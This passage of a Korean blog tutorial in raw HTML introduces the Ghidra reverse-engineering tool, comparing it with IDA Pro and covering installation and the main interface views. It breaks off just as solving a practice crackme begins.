href="https://ko.wikipedia.org/wiki/%EB%A7%88%EC%9D%B4%ED%81%AC%EB%A1%9C%EC%BD%94%EB%93%9C">Microcode</a> &#xAE30;&#xBC18;</li><li>&#xC77C;&#xBD80; &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xB9CC; &#xC9C0;&#xC6D0;</li><li>&#xBCC0;&#xC218;, &#xB370;&#xC774;&#xD130;, &#xD568;&#xC218;&#xC5D0; &#xB300;&#xD55C; xrefer &#xC81C;&#xACF5;</li><li>&#xBCC0;&#xC218; &#xB9E4;&#xD551; &#xAC00;&#xB2A5;</li><li>&#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xC5D0;&#xC11C; &#xBCC0;&#xC218; &#xD45C;&#xD604;&#xC744; &#xBCC0;&#xACBD;&#xD560; &#xC218; &#xC788;&#xC74C;(decimal, hex, char &#xB4F1;)</li></ul><h3 id="Ghidra-Decompiler"><a href="#Ghidra-Decompiler" class="headerlink" title="Ghidra Decompiler"></a>Ghidra Decompiler</h3><ul><li><a href="https://ko.wikipedia.org/wiki/P-%EC%BD%94%EB%93%9C">P-code</a> &#xAE30;&#xBC18;</li><li>&#xBAA8;&#xB4E0; &#xC544;&#xD0A4;&#xD14D;&#xCC98; &#xC9C0;&#xC6D0;</li><li>xref &#xC81C;&#xACF5;&#xD558;&#xC9C0; &#xC54A;&#xC74C;</li><li>&#xBCC0;&#xC218; &#xB9E4;&#xD551; &#xBD88;&#xAC00;&#xB2A5;</li><li>&#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xC5D0;&#xC11C; &#xBCC0;&#xC218; &#xD45C;&#xD604; &#xBCC0;&#xACBD; &#xBD88;&#xAC00;&#xB2A5;</li></ul><p>IDA Pro&#xC640;&#xC758; &#xCC28;&#xC774;&#xC810;&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB3C4; &#xAC04;&#xB7B5;&#xD558;&#xAC8C; &#xC54C;&#xC544;&#xBCF4;&#xC558;&#xC73C;&#xB2C8;, &#xC774;&#xC81C; ghidra&#xB97C; &#xB9CC;&#xB098;&#xB7EC; &#xAC00;&#xBD05;&#xC2DC;&#xB2E4;!</p><h1 id="Ghidra&#xB97C;-&#xC124;&#xCE58;&#xD574;&#xBCF4;&#xC790;"><a href="#Ghidra&#xB97C;-&#xC124;&#xCE58;&#xD574;&#xBCF4;&#xC790;" class="headerlink" title="Ghidra&#xB97C; &#xC124;&#xCE58;&#xD574;&#xBCF4;&#xC790;!"></a>Ghidra&#xB97C; &#xC124;&#xCE58;&#xD574;&#xBCF4;&#xC790;!</h1><p>&#xBA3C;&#xC800; ghidra&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xC124;&#xCE58;&#xB97C; &#xD574;&#xC57C;&#xACA0;&#xC8E0;? ghidra&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xD50C;&#xB7AB;&#xD3FC;&#xC744; &#xC9C0;&#xC6D0;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>Windows 7 or 10 (64-bit)</li><li>Linux (64-bit, CentOS 7 is preferred)</li><li>macOS (OS X) 10.8.3+ (Mountain Lion or later)</li></ul><p>32&#xBE44;&#xD2B8; OS&#xC5D0; &#xB300;&#xD55C; &#xC9C0;&#xC6D0;&#xC740; &#xC77C;&#xC808; &#xC81C;&#xACF5;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xB2C8; &#xCC38;&#xACE0;&#xD574;&#xC8FC;&#xC138;&#xC694;!</p><p>&#xADF8;&#xB9AC;&#xACE0; &#xC704;&#xC5D0;&#xC11C; ghidra&#xB294; JAVA&#xB85C; &#xAC1C;&#xBC1C;&#xB418;&#xC5C8;&#xB2E4;&#xACE0; &#xB9D0;&#xC500;&#xB4DC;&#xB838;&#xC8E0;? &#xB530;&#xB77C;&#xC11C; jdk &#xB610;&#xD55C; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. ghidra&#xC758; &#xC6D0;&#xD65C;&#xD55C; &#xC0AC;&#xC6A9;&#xC744; &#xC704;&#xD574;&#xC11C; <a href="https://www.oracle.com/java/technologies/javase-jdk11-downloads.html">jdk 11</a>&#xC744; &#xC124;&#xCE58;&#xD574;&#xC8FC;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;!</p><p>ghidra &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xC124;&#xCE58;&#xB294; <a href="https://ghidra-sre.org/">ghidra &#xD648;&#xD398;&#xC774;&#xC9C0;</a>&#xC5D0;&#xC11C; Download Ghidra &#xBC84;&#xD2BC;&#xC744; &#xB20C;&#xB7EC; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC124;&#xCE58;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBCC4;&#xB3C4;&#xC758; setup &#xC5C6;&#xC774; &#xC555;&#xCD95;&#xC744; &#xD574;&#xC81C;&#xD55C; &#xD6C4; &#xD50C;&#xB7AB;&#xD3FC;&#xC5D0; &#xB530;&#xB77C; <code>ghidraRun.sh</code>&#xC774;&#xB098; <code>ghidraRun.bat</code>&#xB97C; &#xD074;&#xB9AD;&#xD574;&#xC8FC;&#xBA74; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%203.png" alt></p><blockquote><p><del>&#xBB58; &#xB20C;&#xB7EC;&#xC57C; &#xB420;&#xC9C0; &#xBAA8;&#xB974;&#xACA0;&#xC73C;&#xBA74; &#xADF8;&#xB0E5; &#xB458; &#xB2E4; &#xB20C;&#xB7EC;&#xBCF4;&#xC790;</del></p></blockquote><p>Windows&#xC758; &#xACBD;&#xC6B0; <code>ghidraRun.bat</code>&#xC744; &#xD1B5;&#xD574;&#xC11C; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xB418;&#xACE0;, Linux&#xB098; MacOS&#xB294; <code>ghidraRun.sh</code>&#xC744; &#xD1B5;&#xD574; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><h1 id="&#xAC04;&#xB2E8;&#xD55C;-Crackme&#xB97C;-&#xD1B5;&#xD55C;-Ghidra-&#xD0D0;&#xC0C9;&#xC804;"><a href="#&#xAC04;&#xB2E8;&#xD55C;-Crackme&#xB97C;-&#xD1B5;&#xD55C;-Ghidra-&#xD0D0;&#xC0C9;&#xC804;" class="headerlink" title="&#xAC04;&#xB2E8;&#xD55C; Crackme&#xB97C; &#xD1B5;&#xD55C; Ghidra &#xD0D0;&#xC0C9;&#xC804;"></a>&#xAC04;&#xB2E8;&#xD55C; Crackme&#xB97C; &#xD1B5;&#xD55C; Ghidra &#xD0D0;&#xC0C9;&#xC804;</h1><p>&#xC81C;&#xAC00; Windows &#xBA38;&#xC2E0;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBBC0;&#xB85C; Windows &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC9C4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. Linux&#xC640; MacOS&#xC5D0;&#xC11C;&#xB3C4; &#xC2E4;&#xD589; &#xBC29;&#xC2DD;&#xC758; &#xCC28;&#xC774;&#xB9CC; &#xC874;&#xC7AC;&#xD560; &#xBFD0;, &#xCC28;&#xC774;&#xAC00; &#xC5C6;&#xC73C;&#xB2C8; &#xAC71;&#xC815; &#xC548; &#xD558;&#xC154;&#xB3C4; &#xB429;&#xB2C8;&#xB2E4;! &#xC774; &#xAC8C;&#xC2DC;&#xAE00;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD55C; &#xC608;&#xC81C; &#xD30C;&#xC77C;&#xC740; <a href="https://crackmes.one/crackme/6004daf233c5d42c3d016717">&#xC5EC;&#xAE30;</a>&#xC5D0;&#xC11C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD558;&#xC2E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.(&#xC555;&#xCD95; &#xD30C;&#xC77C;&#xC758; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB294; <code>crackmes.one</code>&#xC785;&#xB2C8;&#xB2E4;.)</p><p>&#xBA3C;&#xC800; <code>ghidraRun.bat</code>&#xC774;&#xB098; <code>ghidraRun.sh</code>&#xC744; &#xD1B5;&#xD574; ghidra&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xD504;&#xB85C;&#xC81D;&#xD2B8; &#xCC3D;&#xC774; &#xB739;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%204.png" alt></p><p>&#xD504;&#xB85C;&#xC81D;&#xD2B8; &#xCC3D;&#xC5D0;&#xC11C;&#xB294; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xB85C;&#xB4DC;, &#xAD6C;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0C8; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xB97C; &#xB9CC;&#xB4E0; &#xD6C4; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xB4DC;&#xB798;&#xADF8; &#xC564; &#xB4DC;&#xB86D;&#xC744; &#xD558;&#xC5EC; &#xCD94;&#xAC00;&#xB97C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%205.png" alt></p><p>File - New Project (Ctrl+N)&#xC744; &#xD1B5;&#xD574; &#xC0C8;&#xB85C;&#xC6B4; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xC704;&#xC5D0;&#xC11C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD55C; &#xC608;&#xC81C; &#xD30C;&#xC77C;&#xC744; &#xB4DC;&#xB798;&#xADF8; &#xC564; &#xB4DC;&#xB86D;&#xD558;&#xAC70;&#xB098; Import File&#xC744; &#xD1B5;&#xD574; &#xCD94;&#xAC00;&#xD558;&#xC5EC; &#xC90D;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%206.png" alt></p><p>&#xBC14;&#xC774;&#xB108;&#xB9AC; import&#xAC00; &#xC644;&#xB8CC;&#xB418;&#xBA74;, Import Summary &#xCC3D;&#xC744; &#xD1B5;&#xD574; &#xAC04;&#xB7B5;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xC815;&#xBCF4;&#xC5D0;&#xC11C; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;, Compiler ID &#xB4F1;&#xB4F1;&#xC744; &#xD1B5;&#xD574; &#xB300;&#xB7B5;&#xC801;&#xC778; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.(&#xC545;&#xC131;&#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xC744; &#xD560; &#xB54C; &#xC88B;&#xACA0;&#xB124;&#xC694;.)</p><p>&#xC774;&#xC81C; &#xD504;&#xB85C;&#xC81D;&#xD2B8; &#xCC3D;&#xC5D0;&#xC11C; crackme.exe&#xB97C; &#xB354;&#xBE14;&#xD074;&#xB9AD;&#xD558;&#xBA74; &#xB4DC;&#xB798;&#xACE4;(!) &#xC560;&#xB2C8;&#xBA54;&#xC774;&#xC158;&#xC774; &#xB728;&#xACE0; &#xBD84;&#xC11D;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xACA0;&#xB0D0;&#xACE0; &#xBB3B;&#xB294; &#xCC3D;&#xC774; &#xB739;&#xB2C8;&#xB2E4;. &#xB2F9;&#xC5F0;&#xD788; Yes&#xB97C; &#xD074;&#xB9AD;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;!</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%207.png" alt></p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%208.png" alt></p><p>Yes&#xB97C; &#xD074;&#xB9AD;&#xD558;&#xBA74; ghidra&#xC5D0;&#xC11C; &#xAC00;&#xB2A5;&#xD55C; &#xBD84;&#xC11D; &#xC635;&#xC158;&#xC744; &#xBCF4;&#xC5EC;&#xC90D;&#xB2C8;&#xB2E4;. &#xAC1C;&#xBCC4;&#xC801;&#xC778; &#xC138;&#xD305;&#xC740; &#xBB34;&#xC2DC;&#xD558;&#xACE0; &#xAE30;&#xBCF8; &#xAC12;&#xC744; &#xADF8;&#xB300;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xC154;&#xB3C4; &#xD070; &#xBB38;&#xC81C;&#xB294; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%209.png" alt></p><p>&#xBD84;&#xC11D;&#xC774; &#xC644;&#xB8CC;&#xB418;&#xACE0; &#xB09C; &#xD6C4; &#xBA54;&#xC778; &#xD654;&#xBA74;&#xC740; &#xC704;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; &#xBA54;&#xC778; &#xD654;&#xBA74;&#xC5D0; &#xAC01; &#xC139;&#xC158;&#xC774; &#xC5B4;&#xB5A0;&#xD55C; &#xAE30;&#xB2A5;&#xC744; &#xD558;&#xB294;&#xC9C0; &#xC0B4;&#xD3B4;&#xBD05;&#xC2DC;&#xB2E4;!</p><h2 id="Program-amp-Symbol-Trees-Data-Type-Manager"><a href="#Program-amp-Symbol-Trees-Data-Type-Manager" class="headerlink" title="Program &amp; Symbol Trees, Data Type Manager"></a>Program &amp; Symbol Trees, Data Type Manager</h2><h3 id="Program-Trees"><a href="#Program-Trees" class="headerlink" title="Program Trees"></a>Program Trees</h3><p>Program Trees&#xB97C; &#xD65C;&#xC6A9;&#xD558;&#xBA74; &#xC6D0;&#xD558;&#xB294; &#xC139;&#xC158;&#xC73C;&#xB85C; &#xD2B8;&#xB9AC;&#xB97C; &#xB098;&#xB20C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2010.png" alt></p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2011.png" alt></p><blockquote><p>Dominance&#xB97C; &#xD1B5;&#xD574; &#xAD6C;&#xC131;&#xB41C; &#xCF54;&#xB4DC; &#xC139;&#xC158; &#xC608;&#xC2DC;</p></blockquote><h3 id="Symbol-Tree"><a href="#Symbol-Tree" class="headerlink" title="Symbol Tree"></a>Symbol Tree</h3><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2012.png" alt></p><p>Symbol Tree&#xC758; &#xACBD;&#xC6B0; Import &#xB41C; DLL, Exports &#xB41C; &#xD568;&#xC218; &#xB4F1;&#xB4F1;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. &#xD2B9;&#xC815; &#xD568;&#xC218;&#xAC00; &#xC5B4;&#xB514;&#xC5D0;&#xC11C; &#xCC38;&#xC870;&#xB418;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2013.png" alt></p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2014.png" alt></p><h3 id="Data-Type-Manager"><a href="#Data-Type-Manager" class="headerlink" title="Data Type Manager"></a>Data Type Manager</h3><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2015.png" alt></p><p>Data Type Manager&#xC5D0;&#xC11C;&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xC81C;&#xACF5;&#xB418;&#xAC70;&#xB098;, &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0;&#xC11C; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xB370;&#xC774;&#xD130; &#xD0C0;&#xC785;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB370;&#xC774;&#xD130; &#xD0C0;&#xC785;&#xC744; &#xC6B0;&#xD074;&#xB9AD;&#xD558;&#xACE0; &#x201C;Find Uses of&#x201D;(<code>Ctrl + Shift + F</code>)&#xB97C; &#xD074;&#xB9AD;&#xD558;&#xC5EC; &#xD574;&#xB2F9; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB0B4;&#xC5D0;&#xC11C; &#xB370;&#xC774;&#xD130; &#xC720;&#xD615;&#xC774; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xACF3;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2016.png" alt></p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2017.png" alt></p><h2 id="Disassembly-View-amp-Function-Graph"><a href="#Disassembly-View-amp-Function-Graph" class="headerlink" title="Disassembly View &amp; Function Graph"></a>Disassembly View &amp; Function Graph</h2><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2018.png" alt></p><p>&#xC911;&#xC559;&#xC5D0; &#xD070; &#xD654;&#xBA74;&#xC740; &#xB514;&#xC2A4; &#xC5B4;&#xC148;&#xBE14; &#xB41C; &#xCF54;&#xB4DC;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294; &#xCC3D;&#xC785;&#xB2C8;&#xB2E4;. &#xC5EC;&#xB7EC; &#xD544;&#xB4DC;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xACE0;, &#xC5B4;&#xB5A4; &#xBD80;&#xBD84;&#xC5D0; &#xBB34;&#xC5C7;&#xC774; &#xD45C;&#xC2DC;&#xB420;&#xC9C0; &#xB4F1; &#xBAA8;&#xB450; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xCEE4;&#xC2A4;&#xD130;&#xB9C8;&#xC774;&#xC9D5; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC0C1;&#xB2E8; &#xD45C;&#xC2DC;&#xC904;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#x201C;Edit the Listing fileds&#x201D;&#xB97C; &#xD074;&#xB9AD;&#xD558;&#xACE0; &#x201C;Instruction/Data&#x201D;&#xB97C; &#xD074;&#xB9AD;&#xD558;&#xBA74; &#xC218;&#xC815;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xD06C;&#xAE30; &#xC870;&#xC815;, &#xC704;&#xCE58; &#xC774;&#xB3D9;, &#xBE44;&#xD65C;&#xC131;&#xD654;, &#xC0C8;&#xB85C;&#xC6B4; &#xAE30;&#xB2A5; &#xCD94;&#xAC00; &#xB4F1; &#xB2E4;&#xC591;&#xD558;&#xAC8C; &#xCEE4;&#xC2A4;&#xD130;&#xB9C8;&#xC774;&#xC9D5; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2019.png" alt></p><p>IDA&#xC5D0;&#xC11C; &#xD568;&#xC218; &#xC774;&#xB984;&#xC744; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC83;&#xCC98;&#xB7FC; ghidra&#xC5D0;&#xC11C;&#xB294; <code>L</code> &#xB2E8;&#xCD95;&#xD0A4;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xC5EC; &#xD568;&#xC218;&#xC758; &#xC774;&#xB984;&#xC744; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2020.png" alt></p><p>&#xB610;&#xD55C; &#xD568;&#xC218;&#xC758; &#xC774;&#xB3D9; &#xC5C6;&#xC774; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xAC00; &#xC5B4;&#xB5A0;&#xD55C; &#xCF54;&#xB4DC;&#xB85C; &#xB418;&#xC5B4;&#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0; &#xC2F6;&#xC73C;&#xBA74; &#xD568;&#xC218; &#xC774;&#xB984;&#xC5D0; &#xB9C8;&#xC6B0;&#xC2A4; &#xCEE4;&#xC11C;&#xB97C; &#xC62C;&#xB824;&#xB193;&#xACE0; &#xAE30;&#xB2E4;&#xB9AC;&#xBA74; &#xD574;&#xB2F9; &#xB0B4;&#xC6A9;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2021.png" alt></p><p>&#xC6D0;&#xD558;&#xB294; &#xBD80;&#xBD84; &#xC6B0;&#xD074;&#xB9AD;-Comments- &#xC6D0;&#xD558;&#xB294; Comment&#xB97C; &#xD1B5;&#xD574; &#xC8FC;&#xC11D;&#xB3C4; &#xCD94;&#xAC00;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. <code>;</code> &#xB2E8;&#xCD95;&#xD0A4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC6D0;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC5D0; &#xBC14;&#xB85C; &#xC8FC;&#xC11D;&#xC744; &#xB2EC; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2022.png" alt></p><blockquote><p><code>;</code>&#xB97C; &#xB20C;&#xB800;&#xC744; &#xB54C; &#xB098;&#xC624;&#xB294; &#xCC3D;. &#xD574;&#xB2F9; &#xCC3D;&#xC5D0; &#xC8FC;&#xC11D;&#xC744; &#xC785;&#xB825;&#xD558;&#xACE0; &#x2018;OK&#x2019;&#xB97C; &#xB204;&#xB974;&#xBA74; &#xB41C;&#xB2E4;.</p></blockquote><p>IDA Pro&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xB54C; &#xAC00;&#xC7A5; &#xD3B8;&#xD588;&#xB358; &#xAE30;&#xB2A5; &#xC911; &#xD558;&#xB098;&#xAC00; &#xADF8;&#xB798;&#xD504; &#xBAA8;&#xB4DC;&#xC600;&#xC8E0;? ghidra&#xC5D0;&#xC11C;&#xB294; &#xB514;&#xC2A4; &#xC5B4;&#xC148;&#xBE14; &#xCC3D;&#xC5D0;&#xC11C; &#xBC14;&#xB85C; &#xADF8;&#xB798;&#xD504; &#xBDF0;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC21C; &#xC5C6;&#xC9C0;&#xB9CC; &#x201C;Windows&#x201D; - &#x201C;Function Graph&#x201D;&#xB97C; &#xD1B5;&#xD574; &#xADF8;&#xB798;&#xD504; &#xBDF0;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2023.png" alt></p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2024.png" alt></p><blockquote><p>ghidra&#xC5D0;&#xC11C; &#xC81C;&#xACF5;&#xD558;&#xB294; function graph. IDA Pro&#xC640; &#xD070; &#xCC28;&#xC774;&#xAC00; &#xB098;&#xC9C4; &#xC54A;&#xB294;&#xB2E4;.</p></blockquote><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2025.png" alt></p><p>Function Graph &#xB610;&#xD55C; &#xB514;&#xC2A4; &#xC5B4;&#xC148;&#xBE14; &#xCC3D;&#xACFC; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; &#xD45C;&#xC2DC;&#xB418;&#xB294; &#xB0B4;&#xC6A9;&#xC744; &#xCEE4;&#xC2A4;&#xD130;&#xB9C8;&#xC774;&#xC9D5; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6B0;&#xCE21; &#xC0C1;&#xB2E8;&#xC758; &#x201C;Edit Code Block Fileds&#x201D;&#xB97C; &#xD074;&#xB9AD;&#xD55C; &#xD6C4; &#x201C;Instruction/Data&#x201D;&#xC5D0;&#xC11C; &#xC544;&#xBB34; &#xACF5;&#xAC04;&#xC774;&#xB098; &#xC6B0;&#xD074;&#xB9AD;-Add Field&#xB85C; &#xC6D0;&#xD558;&#xB294; &#xCF54;&#xB4DC; &#xBE14;&#xB85D;&#xC744; &#xCD94;&#xAC00;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Decompiler"><a href="#Decompiler" class="headerlink" title="Decompiler"></a>Decompiler</h2><p>&#xC774;&#xC81C; IDA Pro&#xC758; hex-rays &#xAE30;&#xB2A5;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xB7EC; &#xCC3D;&#xC785;&#xB2C8;&#xB2E4;. &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xB514;&#xC2A4; &#xC5B4;&#xC148;&#xBE14;&#xB7EC; &#xCC3D; &#xC6B0;&#xCE21;&#xC5D0; &#xC704;&#xCE58;&#xD558;&#xBA70;, &#xD06C;&#xAE30;&#xB97C; &#xC870;&#xC815;&#xD560; &#xC218; &#xC788;&#xACE0; &#xC704;&#xCE58; &#xC870;&#xC815; &#xB610;&#xD55C; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2026.png" alt></p><p>&#xD568;&#xC218; &#xB0B4;&#xBD80;&#xB97C; &#xD074;&#xB9AD;&#xD558;&#xBA74; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xD568;&#xC218; &#xB0B4;&#xC6A9;&#xC774; &#xB514;&#xCEF4;&#xD30C;&#xC77C; &#xB3FC;&#xC11C; &#xC6B0;&#xCE21; &#xB514;&#xCEF4;&#xD30C;&#xC77C; &#xCC3D;&#xC5D0; &#xD45C;&#xC2DC;&#xB429;&#xB2C8;&#xB2E4;. &#xC704;&#xC758; &#xC0AC;&#xC9C4;&#xCC98;&#xB7FC; Function Graph&#xB97C; &#xB04C;&#xC5B4;&#xB2E4; &#xB123;&#xC5B4;&#xC11C; &#xB514;&#xC2A4; &#xC5B4;&#xC148;&#xBE14; &#xCC3D;&#xC774; &#xC544;&#xB2CC; Function Graph &#xCC3D;&#xC774; &#xC88C;&#xCE21;&#xC5D0; &#xD45C;&#xC2DC;&#xB418;&#xAC8C; &#xCEE4;&#xC2A4;&#xD130;&#xB9C8;&#xC774;&#xC9D5;&#xB3C4; &#xD560; &#xC218; &#xC788;&#xC8E0;!</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2027.png" alt></p><p>&#xC704;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xB4DC;&#xB9B0; &#xAC83;&#xACFC; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xB7EC; &#xCC3D;&#xC5D0;&#xC11C;&#xB3C4; &#xBCC0;&#xC218;&#xB098; &#xD568;&#xC218;&#xC758; &#xC774;&#xB984;&#xC744; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xACE0; &#xC8FC;&#xC11D;&#xC744; &#xB2EC; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xB7EC; &#xCC3D;&#xC5D0;&#xC11C; &#xC218;&#xC815;&#xD55C; &#xB0B4;&#xC6A9;&#xC740; &#xB514;&#xC2A4; &#xC5B4;&#xC148;&#xBE14; &#xCC3D;&#xC5D0;&#xB3C4; &#xC801;&#xC6A9;&#xC774; &#xB418;&#xACE0;, &#xB514;&#xC2A4; &#xC5B4;&#xC148;&#xBE14; &#xCC3D;&#xC5D0;&#xC11C; &#xC218;&#xC815;&#xD55C; &#xB0B4;&#xC6A9;&#xB3C4; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xB7EC; &#xCC3D;&#xC5D0; &#xC801;&#xC6A9;&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="Crackme&#xB97C;-&#xD480;&#xC5B4;&#xBCF4;&#xC790;"><a href="#Crackme&#xB97C;-&#xD480;&#xC5B4;&#xBCF4;&#xC790;" class="headerlink" title="Crackme&#xB97C; &#xD480;&#xC5B4;&#xBCF4;&#xC790;!"></a>Crackme&#xB97C; &#xD480;&#xC5B4;&#xBCF4;&#xC790;!</h2><p>&#xC774;&#xC81C; ghidra&#xC758; &#xB300;&#xB7B5;&#xC801;&#xC778; &#xAE30;&#xB2A5;&#xB3C4; &#xD655;&#xC778;&#xC744; &#xD574;&#xBCF4;&#xC558;&#xC73C;&#xB2C8; Crackme&#xB97C; 